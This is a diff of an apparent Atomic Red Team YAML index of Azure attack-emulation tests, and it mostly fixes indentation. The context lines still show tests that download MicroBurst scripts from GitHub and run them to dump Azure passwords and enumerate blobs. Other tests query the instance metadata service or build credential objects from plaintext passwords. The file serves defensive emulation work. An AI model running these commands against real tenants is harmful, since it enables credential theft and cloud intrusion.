@@ -8147,14 +8147,14 @@ stealth:
       dependencies:
       - description: 'Check if terraform is installed.
 
-'
+          '
         prereq_command: 'terraform version
 
-'
+          '
         get_prereq_command: 'echo "Please install terraform via https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli
           (URL accurate as of Nov. 15, 2024)."
 
-'
+          '
       - description: |
           Check if Azure CLI and Azure Powershell are installed.
 
@@ -8163,21 +8163,21 @@ stealth:
         prereq_command: 'try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue)
           {exit 0} else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest
           -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\\AzureCLI.msi;
           Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet';
           Remove-Item .\\AzureCLI.msi\n"
       - description: 'Check if the user is logged into Azure.
 
-'
+          '
         prereq_command: 'try {if (-not (Get-AzContext)) { exit 1 } else { exit 0 }}
           catch {exit 1}
 
-'
+          '
         get_prereq_command: 'echo "* Configure your Azure account using: Connect-AzAccount"
 
-'
+          '
       - description: |
           Create dependency resources using terraform
 
@@ -8187,7 +8187,7 @@ stealth:
         prereq_command: 'try {if (Test-Path "$PathToAtomicsFolder/T1078.004/src/T1078.004-2/terraform.tfstate"
           ){ exit 0 } else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: |
           echo "Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/"
           cd "$PathToAtomicsFolder/T1078.004/src/T1078.004-2/"
@@ -8198,7 +8198,7 @@ stealth:
           #{resource_group} -Description ''my-test-runbook'' -AutomationAccountName
           #{automation_account_name}
 
-'
+          '
         name: powershell
         elevation_required: false
         cleanup_command: |
@@ -12950,14 +12950,14 @@ privilege-escalation:
       dependencies:
       - description: 'Az.Resources module must be installed.
 
-'
+          '
         prereq_command: 'try {if (Get-InstalledModule -Name Az.Resources -ErrorAction
           SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: 'Install-Module -Name Az.Resources -Force
 
-'
+          '
       executor:
         command: |
           Import-Module -Name Az.Resources
@@ -13030,14 +13030,14 @@ privilege-escalation:
       dependencies:
       - description: 'Az.Resources module must be installed.
 
-'
+          '
         prereq_command: 'try {if (Get-InstalledModule -Name Az.Resources -ErrorAction
           SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: 'Install-Module -Name Az.Resources -Force
 
-'
+          '
       executor:
         command: "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString
           -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName
@@ -15451,14 +15451,14 @@ privilege-escalation:
       dependencies:
       - description: 'Check if terraform is installed.
 
-'
+          '
         prereq_command: 'terraform version
 
-'
+          '
         get_prereq_command: 'echo "Please install terraform via https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli
           (URL accurate as of Nov. 15, 2024)."
 
-'
+          '
       - description: |
           Check if Azure CLI and Azure Powershell are installed.
 
@@ -15467,21 +15467,21 @@ privilege-escalation:
         prereq_command: 'try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue)
           {exit 0} else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest
           -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\\AzureCLI.msi;
           Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet';
           Remove-Item .\\AzureCLI.msi\n"
       - description: 'Check if the user is logged into Azure.
 
-'
+          '
         prereq_command: 'try {if (-not (Get-AzContext)) { exit 1 } else { exit 0 }}
           catch {exit 1}
 
-'
+          '
         get_prereq_command: 'echo "* Configure your Azure account using: Connect-AzAccount"
 
-'
+          '
       - description: |
           Create dependency resources using terraform
 
@@ -15491,7 +15491,7 @@ privilege-escalation:
         prereq_command: 'try {if (Test-Path "$PathToAtomicsFolder/T1078.004/src/T1078.004-2/terraform.tfstate"
           ){ exit 0 } else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: |
           echo "Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/"
           cd "$PathToAtomicsFolder/T1078.004/src/T1078.004-2/"
@@ -15502,7 +15502,7 @@ privilege-escalation:
           #{resource_group} -Description ''my-test-runbook'' -AutomationAccountName
           #{automation_account_name}
 
-'
+          '
         name: powershell
         elevation_required: false
         cleanup_command: |
@@ -24283,14 +24283,14 @@ persistence:
       dependencies:
       - description: 'Az.Resources module must be installed.
 
-'
+          '
         prereq_command: 'try {if (Get-InstalledModule -Name Az.Resources -ErrorAction
           SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: 'Install-Module -Name Az.Resources -Force
 
-'
+          '
       executor:
         command: |
           Import-Module -Name Az.Resources
@@ -24363,14 +24363,14 @@ persistence:
       dependencies:
       - description: 'Az.Resources module must be installed.
 
-'
+          '
         prereq_command: 'try {if (Get-InstalledModule -Name Az.Resources -ErrorAction
           SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: 'Install-Module -Name Az.Resources -Force
 
-'
+          '
       executor:
         command: "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString
           -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName
@@ -27055,14 +27055,14 @@ persistence:
       dependencies:
       - description: 'Check if terraform is installed.
 
-'
+          '
         prereq_command: 'terraform version
 
-'
+          '
         get_prereq_command: 'echo "Please install terraform via https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli
           (URL accurate as of Nov. 15, 2024)."
 
-'
+          '
       - description: |
           Check if Azure CLI and Azure Powershell are installed.
 
@@ -27071,21 +27071,21 @@ persistence:
         prereq_command: 'try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue)
           {exit 0} else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest
           -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\\AzureCLI.msi;
           Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet';
           Remove-Item .\\AzureCLI.msi\n"
       - description: 'Check if the user is logged into Azure.
 
-'
+          '
         prereq_command: 'try {if (-not (Get-AzContext)) { exit 1 } else { exit 0 }}
           catch {exit 1}
 
-'
+          '
         get_prereq_command: 'echo "* Configure your Azure account using: Connect-AzAccount"
 
-'
+          '
       - description: |
           Create dependency resources using terraform
 
@@ -27095,7 +27095,7 @@ persistence:
         prereq_command: 'try {if (Test-Path "$PathToAtomicsFolder/T1078.004/src/T1078.004-2/terraform.tfstate"
           ){ exit 0 } else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: |
           echo "Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/"
           cd "$PathToAtomicsFolder/T1078.004/src/T1078.004-2/"
@@ -27106,7 +27106,7 @@ persistence:
           #{resource_group} -Description ''my-test-runbook'' -AutomationAccountName
           #{automation_account_name}
 
-'
+          '
         name: powershell
         elevation_required: false
         cleanup_command: |
@@ -30107,7 +30107,7 @@ collection:
         or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated
         Mac Malware)
 
-'
+        '
       kill_chain_phases:
       - kill_chain_name: mitre-attack
         phase_name: collection
@@ -34900,11 +34900,11 @@ defense-impairment:
         username:
           description: Azure username
           type: string
-          default: 
+          default:
         password:
           description: Azure password
           type: string
-          default: 
+          default:
         event_hub_name:
           description: Name of the eventhub
           type: string
@@ -34912,46 +34912,46 @@ defense-impairment:
         resource_group:
           description: Name of the resource group
           type: string
-          default: 
+          default:
         name_space_name:
           description: Name of the NameSpace
           type: string
-          default: 
+          default:
       dependency_executor_name: powershell
       dependencies:
       - description: 'Install-Module -Name Az
 
-'
+          '
         prereq_command: 'try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
           {exit 0} else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: 'Install-Module -Name AzureAD -Force
 
-'
+          '
       - description: 'Check if terraform is installed.
 
-'
+          '
         prereq_command: 'terraform version
 
-'
+          '
         get_prereq_command: 'echo Please install the terraform.
 
-'
+          '
       - description: 'Check if the user is logged into Azure.
 
-'
+          '
         prereq_command: 'az account show
 
-'
+          '
         get_prereq_command: "echo Configure your Azure account using: az login. \n"
       - description: 'Create dependency resources using terraform
 
-'
+          '
         prereq_command: 'try {if (Test-Path "$PathToAtomicsFolder/T1685.002/src/T1685.002-2/terraform.tfstate"
           ){ exit 0 } else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: |
           cd "$PathToAtomicsFolder/T1685.002/src/T1685.002-2/"
           terraform init
@@ -37088,37 +37088,37 @@ defense-impairment:
         prereq_command: 'if command -v az > /dev/null 2>&1; then exit 0; else exit
           1; fi
 
-'
+          '
         get_prereq_command: 'echo "Install Azure CLI: https://learn.microsoft.com/en-us/cli/azure/install-azure-cli"
 
-'
+          '
       - description: Azure CLI must be authenticated.
         prereq_command: 'if az account show > /dev/null 2>&1; then exit 0; else exit
           1; fi
 
-'
+          '
         get_prereq_command: 'echo "Login with: az login"
 
-'
+          '
       - description: Azure disk must exist.
         prereq_command: 'if az disk show --resource-group #{azure_resource_group}
           --name #{azure_disk_name} > /dev/null 2>&1; then exit 0; else exit 1; fi
 
-'
+          '
         get_prereq_command: 'echo "Ensure the disk exists in the given resource group."
 
-'
+          '
       executor:
         name: sh
         elevation_required: false
         command: 'az snapshot create --resource-group #{azure_resource_group} --name
           #{azure_snapshot_name} --source #{azure_disk_name} --location eastus
 
-'
+          '
         cleanup_command: 'az snapshot delete --resource-group #{azure_resource_group}
           --name #{azure_snapshot_name}
 
-'
+          '
   T1686.001:
     technique:
       type: attack-pattern
@@ -37907,10 +37907,10 @@ credential-access:
           "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json
           -Depth 64 > #{output_file}
 
-'
+          '
         cleanup_command: 'remove-item #{output_file} -force -erroraction silentlycontinue
 
-'
+          '
         name: powershell
   T1555.002:
     technique:
@@ -41334,7 +41334,7 @@ credential-access:
         username:
           description: Azure AD username
           type: string
-          default: 
+          default:
         password:
           description: Azure AD password
           type: string
@@ -41346,39 +41346,39 @@ credential-access:
         subscription_id:
           description: Azure subscription id to search
           type: string
-          default: 
+          default:
       dependency_executor_name: powershell
       dependencies:
       - description: 'The Get-AzurePasswords script must exist in PathToAtomicsFolder\..\ExternalPayloads.
 
-'
+          '
         prereq_command: 'if (test-path "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"){exit
           0} else {exit 1}
 
-'
+          '
         get_prereq_command: |
           New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
           invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"
       - description: 'The Azure RM module must be installed.
 
-'
+          '
         prereq_command: 'try {if (Get-InstalledModule -Name AzureRM -ErrorAction SilentlyContinue)
           {exit 0} else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: 'Install-Module -Name AzureRM -Force -allowclobber
 
-'
+          '
       - description: 'The Azure module must be installed.
 
-'
+          '
         prereq_command: 'try {if (Get-InstalledModule -Name Azure -ErrorAction SilentlyContinue)
           {exit 0} else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: 'Install-Module -Name Azure -Force -allowclobber
 
-'
+          '
       executor:
         command: |
           import-module "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"
@@ -41389,7 +41389,7 @@ credential-access:
           cat #{output_file}
         cleanup_command: 'remove-item #{output_file} -force -erroraction silentlycontinue
 
-'
+          '
         name: powershell
         elevation_required: true
   T1003.008:
@@ -44106,11 +44106,11 @@ discovery:
         container_name:
           description: Container name to search for (optional)
           type: string
-          default: 
+          default:
         blob_name:
           description: Blob name to search for (optional)
           type: string
-          default: 
+          default:
       executor:
         command: |
           try{$response = invoke-webrequest "https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}" -method "GET"}
@@ -44124,7 +44124,7 @@ discovery:
           "Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody" | out-file -filepath #{output_file} -append
         cleanup_command: 'remove-item #{output_file} -erroraction silentlycontinue
 
-'
+          '
         name: powershell
     - name: Azure - Enumerate Azure Blobs with MicroBurst
       auto_generated_guid: 3dab4bcc-667f-4459-aea7-4162dd2d6590
@@ -44151,31 +44151,31 @@ discovery:
       dependencies:
       - description: 'The Invoke-EnumerateAzureBlobs module must exist in PathToAtomicsFolder\..\ExternalPayloads.
 
-'
+          '
         prereq_command: 'if (test-path "PathToAtomicsFolder\..\ExternalPayloads\Invoke-EnumerateAzureBlobs.ps1"){exit
           0} else {exit 1}
 
-'
+          '
         get_prereq_command: |
           New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
           invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/Invoke-EnumerateAzureBlobs.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Invoke-EnumerateAzureBlobs.ps1"
       - description: 'The wordlist file for search permutations must exist in PathToAtomicsFolder\..\ExternalPayloads.
 
-'
+          '
         prereq_command: 'if (test-path "#{wordlist}"){exit 0} else {exit 1}
 
-'
+          '
         get_prereq_command: 'invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/permutations.txt"
           -outfile "#{wordlist}"
 
-'
+          '
       executor:
         command: |
           import-module "PathToAtomicsFolder\..\ExternalPayloads\Invoke-EnumerateAzureBlobs.ps1"
           Invoke-EnumerateAzureBlobs -base #{base} -permutations "#{wordlist}" -outputfile "#{output_file}"
         cleanup_command: 'remove-item #{output_file} -erroraction silentlycontinue
 
-'
+          '
         name: powershell
   T1654:
     technique:
@@ -44835,7 +44835,7 @@ discovery:
         username:
           description: Azure AD username
           type: string
-          default: 
+          default:
         password:
           description: Azure AD password
           type: string
@@ -44847,29 +44847,29 @@ discovery:
         subscription_name:
           description: Azure subscription name to scan
           type: string
-          default: 
+          default:
       dependency_executor_name: powershell
       dependencies:
       - description: 'The Get-AzDomainInfo script must exist in PathToAtomicsFolder\..\ExternalPayloads.
 
-'
+          '
         prereq_command: 'if (test-path "PathToAtomicsFolder\..\ExternalPayloads\Get-AzDomainInfo.ps1"){exit
           0} else {exit 1}
 
-'
+          '
         get_prereq_command: |
           New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
           invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/Az/Get-AzDomainInfo.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Get-AzDomainInfo.ps1"
       - description: 'The Az module must be installed.
 
-'
+          '
         prereq_command: 'try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue)
           {exit 0} else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: 'Install-Module -Name Az -Force
 
-'
+          '
       executor:
         command: |
           import-module "PathToAtomicsFolder\..\ExternalPayloads\Get-AzDomainInfo.ps1"
@@ -44880,29 +44880,29 @@ discovery:
         cleanup_command: 'remove-item #{output_directory} -recurse -force -erroraction
           silentlycontinue
 
-'
+          '
         name: powershell
     - name: Azure - Enumerate common cloud services
       auto_generated_guid: 58f57c8f-db14-4e62-a4d3-5aaf556755d7
       description: 'Upon successful execution, this test will enumerate common resources
         that are contained within a valid Azure subscription.
 
-'
+        '
       supported_platforms:
       - iaas:azure
       input_arguments:
         client_id:
           description: Azure AD client ID
           type: string
-          default: 
+          default:
         client_secret:
           description: Azure AD client secret
           type: string
-          default: 
+          default:
         tenant_id:
           description: Azure AD tenant ID
           type: string
-          default: 
+          default:
         cloud:
           description: Azure cloud environment
           type: string
@@ -44915,14 +44915,14 @@ discovery:
       dependencies:
       - description: 'The Az module must be installed.
 
-'
+          '
         prereq_command: 'try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue)
           {exit 0} else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: 'Install-Module -Name Az -Force
 
-'
+          '
       executor:
         command: |
           Import-Module "PathToAtomicsFolder\T1526\src\AzureDiscovery.ps1"
@@ -54073,14 +54073,14 @@ initial-access:
       dependencies:
       - description: 'Check if terraform is installed.
 
-'
+          '
         prereq_command: 'terraform version
 
-'
+          '
         get_prereq_command: 'echo "Please install terraform via https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli
           (URL accurate as of Nov. 15, 2024)."
 
-'
+          '
       - description: |
           Check if Azure CLI and Azure Powershell are installed.
 
@@ -54089,21 +54089,21 @@ initial-access:
         prereq_command: 'try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue)
           {exit 0} else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest
           -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\\AzureCLI.msi;
           Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet';
           Remove-Item .\\AzureCLI.msi\n"
       - description: 'Check if the user is logged into Azure.
 
-'
+          '
         prereq_command: 'try {if (-not (Get-AzContext)) { exit 1 } else { exit 0 }}
           catch {exit 1}
 
-'
+          '
         get_prereq_command: 'echo "* Configure your Azure account using: Connect-AzAccount"
 
-'
+          '
       - description: |
           Create dependency resources using terraform
 
@@ -54113,7 +54113,7 @@ initial-access:
         prereq_command: 'try {if (Test-Path "$PathToAtomicsFolder/T1078.004/src/T1078.004-2/terraform.tfstate"
           ){ exit 0 } else {exit 1}} catch {exit 1}
 
-'
+          '
         get_prereq_command: |
           echo "Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/"
           cd "$PathToAtomicsFolder/T1078.004/src/T1078.004-2/"
@@ -54124,7 +54124,7 @@ initial-access:
           #{resource_group} -Description ''my-test-runbook'' -AutomationAccountName
           #{automation_account_name}
 
-'
+          '
         name: powershell
         elevation_required: false
         cleanup_command: |
